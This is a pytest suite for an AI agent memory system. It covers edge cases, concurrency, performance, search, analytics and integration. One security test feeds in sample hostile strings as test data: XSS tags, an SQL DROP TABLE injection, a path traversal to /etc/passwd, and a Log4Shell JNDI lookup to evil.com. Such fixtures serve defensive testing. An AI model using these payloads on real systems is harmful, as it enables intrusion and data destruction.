"""
Extended Unit Tests for CoralCollective Memory System

Comprehensive tests covering:
1. Edge cases and error scenarios
2. Performance benchmarks and stress tests
3. Memory consolidation strategies
4. Concurrent access patterns
5. Memory retention policies
6. Advanced search and filtering
7. Memory system recovery and resilience
8. Integration with external vector stores
9. Memory analytics and optimization
10. Security and data validation
"""

import pytest
import asyncio
import tempfile
import shutil
import json
import time
import threading
import concurrent.futures
from datetime import datetime, timedelta
from pathlib import Path
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from typing import Dict, List, Any, Optional
import random
import string

# Import memory system components
import sys
sys.path.append(str(Path(__file__).parent.parent.parent))

try:
    from memory.memory_system import (
        MemorySystem, MemoryOrchestrator, ShortTermMemory, ChromaLongTermMemory,
        MemorySummarizer, MemoryItem, MemoryType, ImportanceLevel
    )
    from memory.coral_memory_integration import CoralMemoryIntegration
    from memory.migration_strategy import MemoryMigrationStrategy
except ImportError as e:
    pytest.skip(f"Memory system not available: {e}", allow_module_level=True)


class TestMemoryEdgeCases:
    """Test edge cases and error scenarios"""
    
    def test_memory_item_with_extreme_values(self):
        """Test MemoryItem with extreme values"""
        
        # Test with very long content
        long_content = "x" * 100000  # 100KB content
        item = MemoryItem(
            id="long_content_test",
            content=long_content,
            memory_type=MemoryType.SHORT_TERM,
            timestamp=datetime.now(),
            agent_id="test_agent",
            project_id="test_project",
            importance=ImportanceLevel.MEDIUM,
            context={},
            tags=[]
        )
        
        assert len(item.content) == 100000
        assert item.id == "long_content_test"
        
    def test_memory_item_with_special_characters(self):
        """Test MemoryItem with special characters and unicode"""
        
        special_content = "Test with émojis 🚀, special chars: @#$%^&*(), and unicode: 中文测试"
        item = MemoryItem(
            id="special_chars_test",
            content=special_content,
            memory_type=MemoryType.SHORT_TERM,
            timestamp=datetime.now(),
            agent_id="test_agent",
            project_id="test_project",
            importance=ImportanceLevel.MEDIUM,
            context={"emoji": "🚀", "unicode": "中文"},
            tags=["emoji", "unicode", "special-chars"]
        )
        
        assert "🚀" in item.content
        assert "中文测试" in item.content
        assert item.context["emoji"] == "🚀"
        
    def test_memory_item_with_invalid_timestamp_formats(self):
        """Test MemoryItem with various timestamp formats"""
        
        # Test with string timestamp
        item1 = MemoryItem(
            id="timestamp_test_1",
            content="Test content",
            memory_type=MemoryType.SHORT_TERM,
            timestamp="2023-12-01T10:00:00.123456",  # String timestamp
            agent_id="test_agent",
            project_id="test_project",
            importance=ImportanceLevel.MEDIUM,
            context={},
            tags=[]
        )
        
        assert isinstance(item1.timestamp, datetime)
        
        # Test with ISO format without microseconds
        item2 = MemoryItem(
            id="timestamp_test_2",
            content="Test content",
            memory_type=MemoryType.SHORT_TERM,
            timestamp="2023-12-01T10:00:00",
            agent_id="test_agent",
            project_id="test_project",
            importance=ImportanceLevel.MEDIUM,
            context={},
            tags=[]
        )
        
        assert isinstance(item2.timestamp, datetime)
        
    def test_memory_orchestrator_with_empty_content(self):
        """Test MemoryOrchestrator with edge case content"""
        
        config = {
            'short_term_limit': 10,
            'consolidation_threshold': 0.7,
            'importance_decay_hours': 24
        }
        orchestrator = MemoryOrchestrator(config)
        
        # Test empty content
        empty_importance = orchestrator.calculate_importance("", {})
        assert empty_importance == ImportanceLevel.LOW
        
        # Test whitespace-only content
        whitespace_importance = orchestrator.calculate_importance("   \n\t   ", {})
        assert whitespace_importance == ImportanceLevel.LOW
        
        # Test very short content
        short_importance = orchestrator.calculate_importance("ok", {})
        assert short_importance == ImportanceLevel.LOW
        
    def test_memory_orchestrator_attention_weights_edge_cases(self):
        """Test attention weight generation with edge cases"""
        
        config = {'short_term_limit': 10, 'consolidation_threshold': 0.7, 'importance_decay_hours': 24}
        orchestrator = MemoryOrchestrator(config)
        
        # Test with empty memories list
        weights = orchestrator.generate_attention_weights("test query", [])
        assert weights == []
        
        # Test with single memory
        memory = MemoryItem(
            id="single_memory",
            content="Single memory test",
            memory_type=MemoryType.SHORT_TERM,
            timestamp=datetime.now(),
            agent_id="test_agent",
            project_id="test_project",
            importance=ImportanceLevel.MEDIUM,
            context={},
            tags=[]
        )
        
        weights = orchestrator.generate_attention_weights("test", [memory])
        assert len(weights) == 1
        assert isinstance(weights[0], float)
        assert 0.0 <= weights[0] <= 1.0
        
    @pytest.mark.asyncio
    async def test_memory_system_error_recovery(self):
        """Test memory system error recovery"""
        
        temp_dir = Path(tempfile.mkdtemp())
        try:
            config = {
                "short_term": {"buffer_size": 10, "max_tokens": 5000},
                "long_term": {
                    "type": "chroma",
                    "collection_name": "test_error_recovery",
                    "persist_directory": str(temp_dir / "chroma_test")
                },
                "orchestrator": {
                    "short_term_limit": 10,
                    "consolidation_threshold": 0.5,
                    "importance_decay_hours": 12
                }
            }
            
            config_path = temp_dir / "memory_config.json"
            with open(config_path, 'w') as f:
                json.dump(config, f)
            
            with patch('memory.memory_system.chromadb'):
                memory_system = MemorySystem(str(config_path))
                
                # Test adding memory when long-term storage fails
                with patch.object(memory_system.long_term, 'add_memory', side_effect=Exception("Storage error")):
                    memory_id = await memory_system.add_memory(
                        content="Test content with storage error",
                        agent_id="test_agent",
                        project_id="test_project"
                    )
                    
                    # Should still work, storing in short-term only
                    assert memory_id is not None
                    assert len(memory_system.short_term.buffer) == 1
                    
        finally:
            if temp_dir.exists():
                shutil.rmtree(temp_dir)


class TestMemoryPerformanceExtended:
    """Extended performance tests for memory system"""
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_concurrent_memory_addition(self):
        """Test concurrent memory addition performance"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            async def add_memories_batch(batch_id: int, count: int):
                """Add a batch of memories concurrently"""
                tasks = []
                for i in range(count):
                    task = memory_system.add_memory(
                        content=f"Concurrent memory batch {batch_id}, item {i}",
                        agent_id=f"agent_{batch_id}",
                        project_id="concurrent_test"
                    )
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks)
                return len([r for r in results if r is not None])
            
            # Test concurrent batches
            start_time = time.time()
            
            batch_tasks = [
                add_memories_batch(batch_id, 50) for batch_id in range(5)
            ]
            
            batch_results = await asyncio.gather(*batch_tasks)
            
            end_time = time.time()
            duration = end_time - start_time
            
            # Verify all memories were added
            total_added = sum(batch_results)
            assert total_added == 250  # 5 batches * 50 each
            
            # Should complete within reasonable time
            assert duration < 10.0  # 10 seconds for 250 concurrent operations
            
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_memory_search_performance_large_dataset(self):
        """Test search performance with large dataset"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Add a large number of memories
            num_memories = 1000
            
            # Add memories in batches for better performance
            batch_size = 100
            for batch_start in range(0, num_memories, batch_size):
                batch_tasks = []
                for i in range(batch_start, min(batch_start + batch_size, num_memories)):
                    content = f"Memory item {i} with searchable content about {'API' if i % 10 == 0 else 'UI' if i % 10 == 5 else 'database'}"
                    task = memory_system.add_memory(
                        content=content,
                        agent_id=f"agent_{i % 10}",
                        project_id="performance_test",
                        tags=[f"tag_{i % 20}", "performance"]
                    )
                    batch_tasks.append(task)
                
                await asyncio.gather(*batch_tasks)
            
            # Test search performance
            search_queries = ["API", "UI", "database", "searchable", "content"]
            
            for query in search_queries:
                start_time = time.time()
                
                results = await memory_system.search_memories(query, limit=20)
                
                search_time = time.time() - start_time
                
                # Search should be fast even with large dataset
                assert search_time < 1.0  # Should complete within 1 second
                assert len(results) > 0  # Should find relevant results
                
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_memory_consolidation_performance(self):
        """Test memory consolidation performance"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Fill up short-term memory to trigger consolidation
            for i in range(100):
                await memory_system.add_memory(
                    content=f"Consolidation test memory {i}",
                    agent_id=f"agent_{i % 5}",
                    project_id="consolidation_test",
                    context={"importance": "high" if i % 10 == 0 else "medium"}
                )
            
            # Measure consolidation performance
            start_time = time.time()
            
            # Manually trigger consolidation process
            with patch.object(memory_system.orchestrator, 'should_consolidate_to_long_term', return_value=True):
                consolidation_tasks = []
                for memory in memory_system.short_term.buffer[:50]:  # Consolidate half
                    task = memory_system.long_term.add_memory(memory)
                    consolidation_tasks.append(task)
                
                await asyncio.gather(*consolidation_tasks)
            
            consolidation_time = time.time() - start_time
            
            # Consolidation should be efficient
            assert consolidation_time < 5.0  # Should complete within 5 seconds
            
    @pytest.mark.performance
    def test_memory_system_memory_usage(self):
        """Test memory system memory usage and leak detection"""
        
        import psutil
        import gc
        
        process = psutil.Process()
        initial_memory = process.memory_info().rss
        
        with patch('memory.memory_system.chromadb'):
            # Create and destroy multiple memory systems
            for iteration in range(10):
                memory_system = MemorySystem()
                
                # Add memories
                for i in range(100):
                    # Use synchronous version or mock async calls
                    memory_item = MemoryItem(
                        id=f"mem_{iteration}_{i}",
                        content=f"Memory usage test {i}",
                        memory_type=MemoryType.SHORT_TERM,
                        timestamp=datetime.now(),
                        agent_id=f"agent_{i % 5}",
                        project_id="memory_usage_test",
                        importance=ImportanceLevel.MEDIUM,
                        context={},
                        tags=[]
                    )
                    memory_system.short_term.buffer.append(memory_item)
                
                # Force garbage collection
                del memory_system
                gc.collect()
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (less than 100MB)
        assert memory_increase < 100 * 1024 * 1024  # 100MB


class TestMemorySystemStressTests:
    """Stress tests for memory system resilience"""
    
    @pytest.mark.stress
    @pytest.mark.asyncio
    async def test_rapid_memory_operations(self):
        """Test rapid memory operations without delays"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            operations = []
            
            # Rapid fire operations
            for i in range(500):
                if i % 10 == 0:
                    # Add search operations
                    operations.append(
                        memory_system.search_memories(f"query_{i}", limit=5)
                    )
                else:
                    # Add memory operations
                    operations.append(
                        memory_system.add_memory(
                            content=f"Rapid operation memory {i}",
                            agent_id=f"agent_{i % 10}",
                            project_id="stress_test"
                        )
                    )
            
            start_time = time.time()
            results = await asyncio.gather(*operations, return_exceptions=True)
            duration = time.time() - start_time
            
            # Count successful operations
            successful_ops = len([r for r in results if not isinstance(r, Exception)])
            
            # Should handle most operations successfully
            assert successful_ops > len(operations) * 0.8  # At least 80% success rate
            assert duration < 30.0  # Should complete within 30 seconds
            
    @pytest.mark.stress
    @pytest.mark.asyncio
    async def test_memory_system_with_large_context(self):
        """Test memory system with very large context data"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Create large context objects
            large_contexts = []
            for i in range(10):
                large_context = {
                    "id": f"context_{i}",
                    "data": "x" * 10000,  # 10KB per context
                    "nested": {
                        "level1": {"level2": {"level3": "deep_data" * 1000}},
                        "arrays": list(range(1000)),
                        "metadata": {f"key_{j}": f"value_{j}" * 100 for j in range(50)}
                    }
                }
                large_contexts.append(large_context)
            
            # Add memories with large contexts
            tasks = []
            for i, context in enumerate(large_contexts):
                task = memory_system.add_memory(
                    content=f"Memory with large context {i}",
                    agent_id=f"stress_agent_{i}",
                    project_id="stress_context_test",
                    context=context
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            
            # All operations should succeed
            assert all(r is not None for r in results)
            assert len(memory_system.short_term.buffer) == 10
            
    @pytest.mark.stress
    def test_threaded_memory_access(self):
        """Test thread-safe memory access"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            def worker_thread(thread_id: int, num_operations: int):
                """Worker function for threaded test"""
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                async def async_worker():
                    results = []
                    for i in range(num_operations):
                        try:
                            memory_id = await memory_system.add_memory(
                                content=f"Thread {thread_id} memory {i}",
                                agent_id=f"thread_agent_{thread_id}",
                                project_id="thread_safety_test"
                            )
                            results.append(memory_id is not None)
                        except Exception as e:
                            results.append(False)
                    return results
                
                try:
                    return loop.run_until_complete(async_worker())
                finally:
                    loop.close()
            
            # Run multiple threads
            num_threads = 5
            operations_per_thread = 20
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = []
                for thread_id in range(num_threads):
                    future = executor.submit(worker_thread, thread_id, operations_per_thread)
                    futures.append(future)
                
                # Collect results
                all_results = []
                for future in concurrent.futures.as_completed(futures):
                    thread_results = future.result()
                    all_results.extend(thread_results)
            
            # Check success rate
            success_rate = sum(all_results) / len(all_results)
            assert success_rate > 0.8  # At least 80% success rate in threaded environment


class TestMemoryAdvancedSearchAndFiltering:
    """Test advanced search and filtering capabilities"""
    
    @pytest.mark.asyncio
    async def test_complex_query_patterns(self):
        """Test complex search query patterns"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Add diverse memories for testing
            test_memories = [
                ("API development with authentication", "backend_developer", ["api", "auth"], "high"),
                ("Frontend component styling with CSS", "frontend_developer", ["ui", "css"], "medium"),
                ("Database migration for user tables", "backend_developer", ["database", "migration"], "high"),
                ("Unit testing for authentication API", "qa_engineer", ["testing", "api", "auth"], "medium"),
                ("Error handling in React components", "frontend_developer", ["react", "error"], "medium"),
                ("Performance optimization for database queries", "backend_developer", ["database", "performance"], "high"),
                ("User interface accessibility improvements", "frontend_developer", ["ui", "accessibility"], "high"),
                ("API documentation and examples", "technical_writer", ["api", "docs"], "low"),
            ]
            
            for content, agent, tags, importance in test_memories:
                await memory_system.add_memory(
                    content=content,
                    agent_id=agent,
                    project_id="advanced_search_test",
                    tags=tags,
                    context={"importance": importance}
                )
            
            # Test various search patterns
            
            # 1. Simple keyword search
            api_results = await memory_system.search_memories("API", limit=10)
            api_count = len([r for r in api_results if "API" in r.content or "api" in r.tags])
            assert api_count >= 3  # Should find API-related memories
            
            # 2. Agent-specific search  
            backend_memories = [m for m in memory_system.short_term.buffer if m.agent_id == "backend_developer"]
            assert len(backend_memories) == 3
            
            # 3. Tag-based filtering
            auth_memories = [m for m in memory_system.short_term.buffer if "auth" in m.tags]
            assert len(auth_memories) == 2
            
            # 4. Context-based filtering
            high_importance = [m for m in memory_system.short_term.buffer 
                             if m.context.get("importance") == "high"]
            assert len(high_importance) == 4
            
    @pytest.mark.asyncio
    async def test_temporal_search_patterns(self):
        """Test temporal search and filtering"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Add memories with different timestamps
            now = datetime.now()
            timestamps = [
                now - timedelta(hours=1),   # Recent
                now - timedelta(hours=6),   # Few hours ago
                now - timedelta(days=1),    # Yesterday
                now - timedelta(days=7),    # Week ago
                now - timedelta(days=30),   # Month ago
            ]
            
            for i, timestamp in enumerate(timestamps):
                await memory_system.add_memory(
                    content=f"Temporal test memory {i}",
                    agent_id="temporal_agent",
                    project_id="temporal_test",
                    context={"timestamp_test": True, "age_hours": (now - timestamp).total_seconds() / 3600}
                )
                # Update the timestamp manually after creation
                if memory_system.short_term.buffer:
                    memory_system.short_term.buffer[-1].timestamp = timestamp
            
            # Test temporal filtering
            recent_memories = [m for m in memory_system.short_term.buffer 
                             if (now - m.timestamp).total_seconds() < 3600]  # Last hour
            assert len(recent_memories) == 1
            
            daily_memories = [m for m in memory_system.short_term.buffer 
                            if (now - m.timestamp).total_seconds() < 86400]  # Last day
            assert len(daily_memories) == 3
            
    @pytest.mark.asyncio
    async def test_relevance_scoring_and_ranking(self):
        """Test relevance scoring and result ranking"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Add memories with varying relevance to test query
            test_cases = [
                ("React hooks tutorial and best practices", 10),  # High relevance
                ("React components with hooks implementation", 8),  # High relevance
                ("JavaScript hooks in web development", 6),        # Medium relevance
                ("Web development using modern frameworks", 4),    # Low relevance
                ("Database configuration and setup", 1),           # Very low relevance
            ]
            
            for content, expected_relevance in test_cases:
                await memory_system.add_memory(
                    content=content,
                    agent_id="relevance_test_agent",
                    project_id="relevance_test",
                    context={"expected_relevance": expected_relevance}
                )
            
            # Test relevance with specific query
            query = "React hooks"
            
            # Generate attention weights for ranking
            orchestrator = memory_system.orchestrator
            memories = memory_system.short_term.buffer
            weights = orchestrator.generate_attention_weights(query, memories)
            
            # Check that weights are properly distributed
            assert len(weights) == len(memories)
            assert all(0.0 <= w <= 1.0 for w in weights)
            
            # Higher relevance memories should have higher weights
            sorted_indices = sorted(range(len(weights)), key=lambda i: weights[i], reverse=True)
            top_memory = memories[sorted_indices[0]]
            
            # The top result should be highly relevant to "React hooks"
            assert "React hooks" in top_memory.content


class TestMemoryAnalyticsAndOptimization:
    """Test memory analytics and optimization features"""
    
    @pytest.mark.asyncio
    async def test_memory_usage_analytics(self):
        """Test memory usage analytics and reporting"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Add diverse memories for analytics
            agents = ["backend_dev", "frontend_dev", "qa_engineer", "architect"]
            importance_levels = [ImportanceLevel.LOW, ImportanceLevel.MEDIUM, ImportanceLevel.HIGH, ImportanceLevel.CRITICAL]
            
            for i in range(50):
                await memory_system.add_memory(
                    content=f"Analytics test memory {i}",
                    agent_id=agents[i % len(agents)],
                    project_id="analytics_test",
                    context={
                        "iteration": i,
                        "batch": i // 10,
                        "category": f"category_{i % 5}"
                    },
                    tags=[f"tag_{i % 10}", "analytics"],
                    importance=importance_levels[i % len(importance_levels)]
                )
            
            # Get system statistics
            stats = memory_system.get_memory_stats()
            
            assert stats["short_term_memories"] == 50
            assert "working_memory_keys" in stats
            
            # Analyze memory distribution by agent
            agent_distribution = {}
            for memory in memory_system.short_term.buffer:
                agent = memory.agent_id
                agent_distribution[agent] = agent_distribution.get(agent, 0) + 1
            
            # Should have roughly equal distribution
            for agent in agents:
                assert agent_distribution[agent] >= 10  # At least 10 memories per agent
                
            # Analyze importance distribution
            importance_distribution = {}
            for memory in memory_system.short_term.buffer:
                importance = memory.importance
                importance_distribution[importance] = importance_distribution.get(importance, 0) + 1
            
            # Should have memories of all importance levels
            assert len(importance_distribution) == len(importance_levels)
            
    @pytest.mark.asyncio
    async def test_memory_optimization_strategies(self):
        """Test memory optimization and cleanup strategies"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Add memories with various characteristics
            old_timestamp = datetime.now() - timedelta(days=30)
            recent_timestamp = datetime.now() - timedelta(hours=1)
            
            # Old, low importance memories (should be candidates for cleanup)
            for i in range(10):
                memory_item = MemoryItem(
                    id=f"old_low_{i}",
                    content=f"Old low importance memory {i}",
                    memory_type=MemoryType.SHORT_TERM,
                    timestamp=old_timestamp,
                    agent_id="cleanup_test_agent",
                    project_id="optimization_test",
                    importance=ImportanceLevel.LOW,
                    context={"cleanup_candidate": True},
                    tags=["old", "low_importance"]
                )
                memory_system.short_term.buffer.append(memory_item)
                
            # Recent, high importance memories (should be preserved)
            for i in range(10):
                memory_item = MemoryItem(
                    id=f"recent_high_{i}",
                    content=f"Recent high importance memory {i}",
                    memory_type=MemoryType.SHORT_TERM,
                    timestamp=recent_timestamp,
                    agent_id="cleanup_test_agent",
                    project_id="optimization_test",
                    importance=ImportanceLevel.HIGH,
                    context={"preserve": True},
                    tags=["recent", "high_importance"]
                )
                memory_system.short_term.buffer.append(memory_item)
            
            initial_count = len(memory_system.short_term.buffer)
            assert initial_count == 20
            
            # Test consolidation decision logic
            orchestrator = memory_system.orchestrator
            
            cleanup_candidates = []
            preserve_candidates = []
            
            for memory in memory_system.short_term.buffer:
                should_consolidate = orchestrator.should_consolidate_to_long_term(memory)
                if memory.context.get("cleanup_candidate"):
                    # Old, low importance should not consolidate (should be cleaned up)
                    if not should_consolidate:
                        cleanup_candidates.append(memory)
                elif memory.context.get("preserve"):
                    # Recent, high importance should consolidate (should be preserved)
                    if should_consolidate:
                        preserve_candidates.append(memory)
            
            # Verify optimization logic
            assert len(preserve_candidates) > 0  # Some high importance memories should be preserved
            # Note: cleanup_candidates logic depends on specific implementation
            
    def test_memory_access_patterns_analysis(self):
        """Test analysis of memory access patterns"""
        
        config = {'short_term_limit': 10, 'consolidation_threshold': 0.7, 'importance_decay_hours': 24}
        orchestrator = MemoryOrchestrator(config)
        
        # Create memories with access patterns
        memories = []
        for i in range(10):
            memory = MemoryItem(
                id=f"access_pattern_{i}",
                content=f"Access pattern memory {i}",
                memory_type=MemoryType.SHORT_TERM,
                timestamp=datetime.now() - timedelta(hours=i),
                agent_id=f"agent_{i % 3}",
                project_id="access_pattern_test",
                importance=ImportanceLevel.MEDIUM,
                context={"access_count": random.randint(0, 100)},
                tags=[f"pattern_{i % 4}"]
            )
            # Simulate access count
            memory.access_count = random.randint(0, 50)
            memories.append(memory)
        
        # Analyze access patterns
        access_counts = [m.access_count for m in memories]
        avg_access = sum(access_counts) / len(access_counts)
        
        highly_accessed = [m for m in memories if m.access_count > avg_access]
        rarely_accessed = [m for m in memories if m.access_count < avg_access / 2]
        
        # Highly accessed memories should be more likely to be preserved
        # This is a basic analysis - real implementation might be more sophisticated
        assert len(highly_accessed) + len(rarely_accessed) <= len(memories)


class TestMemorySecurityAndValidation:
    """Test security features and data validation"""
    
    @pytest.mark.asyncio
    async def test_memory_content_sanitization(self):
        """Test content sanitization and security"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Test with potentially malicious content
            malicious_contents = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE memories; --",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
            ]
            
            for i, malicious_content in enumerate(malicious_contents):
                memory_id = await memory_system.add_memory(
                    content=malicious_content,
                    agent_id="security_test_agent",
                    project_id="security_test",
                    context={"security_test": True, "test_type": f"malicious_{i}"}
                )
                
                # Memory should be added (content sanitization handled elsewhere if needed)
                assert memory_id is not None
                
            # Verify memories were stored
            assert len(memory_system.short_term.buffer) == len(malicious_contents)
            
    def test_memory_input_validation(self):
        """Test input validation for memory creation"""
        
        config = {'short_term_limit': 10, 'consolidation_threshold': 0.7, 'importance_decay_hours': 24}
        orchestrator = MemoryOrchestrator(config)
        
        # Test with invalid inputs
        
        # Empty agent_id should still work but be handled appropriately
        item_empty_agent = MemoryItem(
            id="test_empty_agent",
            content="Test content",
            memory_type=MemoryType.SHORT_TERM,
            timestamp=datetime.now(),
            agent_id="",  # Empty agent ID
            project_id="validation_test",
            importance=ImportanceLevel.MEDIUM,
            context={},
            tags=[]
        )
        
        assert item_empty_agent.agent_id == ""  # Should be preserved as is
        
        # Very long agent_id
        long_agent_id = "a" * 1000
        item_long_agent = MemoryItem(
            id="test_long_agent",
            content="Test content",
            memory_type=MemoryType.SHORT_TERM,
            timestamp=datetime.now(),
            agent_id=long_agent_id,
            project_id="validation_test",
            importance=ImportanceLevel.MEDIUM,
            context={},
            tags=[]
        )
        
        assert len(item_long_agent.agent_id) == 1000
        
        # Test importance calculation with edge cases
        importance = orchestrator.calculate_importance(None, {})  # None content
        assert importance == ImportanceLevel.LOW
        
    @pytest.mark.asyncio
    async def test_memory_data_integrity(self):
        """Test data integrity and consistency checks"""
        
        with patch('memory.memory_system.chromadb'):
            memory_system = MemorySystem()
            
            # Add memories and verify integrity
            original_memories = []
            for i in range(20):
                content = f"Integrity test memory {i}"
                memory_id = await memory_system.add_memory(
                    content=content,
                    agent_id=f"integrity_agent_{i % 5}",
                    project_id="integrity_test",
                    tags=[f"tag_{i}", "integrity"],
                    context={"index": i, "checksum": hash(content)}
                )
                
                original_memories.append({
                    "id": memory_id,
                    "content": content,
                    "checksum": hash(content)
                })
            
            # Verify all memories are present and intact
            stored_memories = memory_system.short_term.buffer
            assert len(stored_memories) == 20
            
            # Check data integrity
            for stored_memory in stored_memories:
                # Find corresponding original
                original = next(
                    (om for om in original_memories if om["content"] == stored_memory.content),
                    None
                )
                assert original is not None
                
                # Verify checksum
                assert hash(stored_memory.content) == original["checksum"]
                
                # Verify structure
                assert isinstance(stored_memory.timestamp, datetime)
                assert isinstance(stored_memory.tags, list)
                assert isinstance(stored_memory.context, dict)


# Integration test with all extended features
@pytest.mark.integration
@pytest.mark.asyncio
class TestMemorySystemIntegrationExtended:
    """Extended integration tests covering full system functionality"""
    
    async def test_comprehensive_memory_workflow(self):
        """Test comprehensive memory system workflow with all features"""
        
        temp_dir = Path(tempfile.mkdtemp())
        try:
            # Create comprehensive configuration
            config = {
                "short_term": {
                    "buffer_size": 100,
                    "max_tokens": 50000
                },
                "long_term": {
                    "type": "chroma",
                    "collection_name": "comprehensive_test",
                    "persist_directory": str(temp_dir / "chroma_comprehensive")
                },
                "orchestrator": {
                    "short_term_limit": 100,
                    "consolidation_threshold": 0.6,
                    "importance_decay_hours": 48
                }
            }
            
            config_path = temp_dir / "comprehensive_config.json"
            with open(config_path, 'w') as f:
                json.dump(config, f)
            
            with patch('memory.memory_system.chromadb'):
                memory_system = MemorySystem(str(config_path))
                
                # Phase 1: Add diverse memories
                agents = ["architect", "backend_dev", "frontend_dev", "qa_engineer", "devops"]
                projects = ["web_app", "mobile_app", "api_service"]
                
                memory_ids = []
                for i in range(50):
                    content = f"Comprehensive test memory {i}: {random.choice(['Implement', 'Design', 'Test', 'Deploy'])} {random.choice(['API', 'UI', 'Database', 'Infrastructure'])} for {random.choice(['user management', 'authentication', 'reporting', 'analytics'])}"
                    
                    memory_id = await memory_system.add_memory(
                        content=content,
                        agent_id=agents[i % len(agents)],
                        project_id=projects[i % len(projects)],
                        context={
                            "phase": i // 10 + 1,
                            "priority": random.choice(["high", "medium", "low"]),
                            "complexity": random.randint(1, 10),
                            "estimated_hours": random.randint(1, 40)
                        },
                        tags=[
                            f"phase_{i // 10 + 1}",
                            random.choice(["api", "ui", "database", "infrastructure"]),
                            random.choice(["implementation", "design", "testing", "deployment"])
                        ]
                    )
                    memory_ids.append(memory_id)
                
                # Phase 2: Test search and retrieval
                search_queries = ["API implementation", "UI design", "database testing", "infrastructure deployment"]
                
                for query in search_queries:
                    results = await memory_system.search_memories(query, limit=10)
                    assert len(results) > 0
                
                # Phase 3: Test agent context retrieval
                for agent in agents:
                    for project in projects:
                        context = await memory_system.get_agent_context(agent, project)
                        
                        assert "recent_memories" in context
                        assert "working_memory" in context
                        assert "relevant_memories" in context
                        assert "session_context" in context
                
                # Phase 4: Test handoff recording and retrieval
                handoff_data = {
                    "summary": "Architecture phase completed, backend development ready to start",
                    "artifacts": ["architecture_diagram.png", "api_specification.yaml"],
                    "next_steps": ["Implement user authentication", "Set up database schema"],
                    "blockers": [],
                    "estimated_effort": "2 weeks"
                }
                
                await memory_system.record_agent_handoff(
                    from_agent="architect",
                    to_agent="backend_dev",
                    project_id="web_app",
                    handoff_data=handoff_data
                )
                
                # Phase 5: Verify system statistics and health
                stats = memory_system.get_memory_stats()
                assert stats["short_term_memories"] > 50  # Original 50 + handoff
                
                # Phase 6: Test system under load
                concurrent_operations = []
                for i in range(20):
                    if i % 4 == 0:
                        # Search operation
                        concurrent_operations.append(
                            memory_system.search_memories(f"concurrent search {i}", limit=5)
                        )
                    else:
                        # Add memory operation
                        concurrent_operations.append(
                            memory_system.add_memory(
                                content=f"Concurrent operation memory {i}",
                                agent_id=agents[i % len(agents)],
                                project_id=projects[i % len(projects)]
                            )
                        )
                
                concurrent_results = await asyncio.gather(*concurrent_operations, return_exceptions=True)
                
                # Most operations should succeed
                successful_operations = len([r for r in concurrent_results if not isinstance(r, Exception)])
                assert successful_operations > len(concurrent_operations) * 0.8
                
                # Final verification
                final_stats = memory_system.get_memory_stats()
                assert final_stats["short_term_memories"] > stats["short_term_memories"]
                
        finally:
            if temp_dir.exists():
                shutil.rmtree(temp_dir)


if __name__ == "__main__":
    # Run extended memory system tests
    pytest.main([__file__, "-v", "--tb=short"])